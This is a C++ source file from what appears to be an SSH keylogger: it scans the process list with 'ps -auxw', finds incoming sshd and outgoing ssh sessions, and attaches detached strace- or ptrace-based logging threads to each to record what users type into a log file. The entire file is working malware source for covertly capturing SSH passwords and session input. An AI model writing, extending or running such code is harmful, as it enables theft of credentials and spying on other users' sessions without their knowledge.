#include "keylogger.hpp"

std::vector<Process> get_proc_list_of_ssh(){
    std::string command("ps -auxw");
    std::array<char, 128> buffer{};
    std::vector<Process> proc_list;
    DEBUG_STDOUT("Opening reading PIPE from ps process output");
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        DEBUG_STDERR("Couldn't 'ps -auxw' command");
        return {};
    }
    fgets(buffer.data(), 128, pipe);
    while (fgets(buffer.data(), 128, pipe) != nullptr) {
        std::string proc_info{buffer.data()};
        if(proc_info.find("ssh") != std::string::npos){
            const auto& [username, pid, cmd, cmd_args] = parsing_utils::split_proc_info(proc_info);
            proc_list.emplace_back(Process{username, pid, cmd, cmd_args});
        }
    }
    pclose(pipe);
    DEBUG_STDOUT("Closing PIPE");
    return proc_list;
}

void check_ps(const std::string& flag, std::string& path_to_log){
    auto proc_list = get_proc_list_of_ssh();
    logger::Strace *strace_obj = new logger::Strace {path_to_log};
    logger::Ptrace *ptrace_obj = new logger::Ptrace {path_to_log};
    for (auto &proc : proc_list){
        if (proc.find_incoming_ssh()){
            HandledProcesses& obj = HandledProcesses::getInstance();
            auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
            if(it == obj.get_current_proc_list().end()){
                obj.get_current_proc_list().emplace_back(proc.get_pid());
                if (flag == "strace") {
                    std::thread sshd_keylog(&logger::Strace::ssh_incoming_logger, strace_obj, proc.get_pid());
                    sshd_keylog.detach();
                }
                else if (flag == "ptrace") {
                    std::thread sshd_keylog(&logger::Ptrace::ssh_incoming_logger, ptrace_obj, proc.get_pid());
                    sshd_keylog.detach();
                }
            }
        }
        else if(proc.find_outgoing_ssh()){
            HandledProcesses& obj = HandledProcesses::getInstance();
            auto it = std::find(obj.get_current_proc_list().begin(), obj.get_current_proc_list().end(), proc.get_pid());
            if(it == obj.get_current_proc_list().end()){
                obj.get_current_proc_list().emplace_back(proc.get_pid());
                if (flag == "strace") {
                    std::thread ssh_keylog(&logger::Strace::ssh_outgoing_logger, strace_obj, proc.get_pid());
                    ssh_keylog.detach();
                }
                else if (flag == "ptrace") {
                    std::thread sshd_keylog(&logger::Ptrace::ssh_outgoing_logger, ptrace_obj, proc.get_pid());
                    sshd_keylog.detach();
                }
            }
        }
    }
}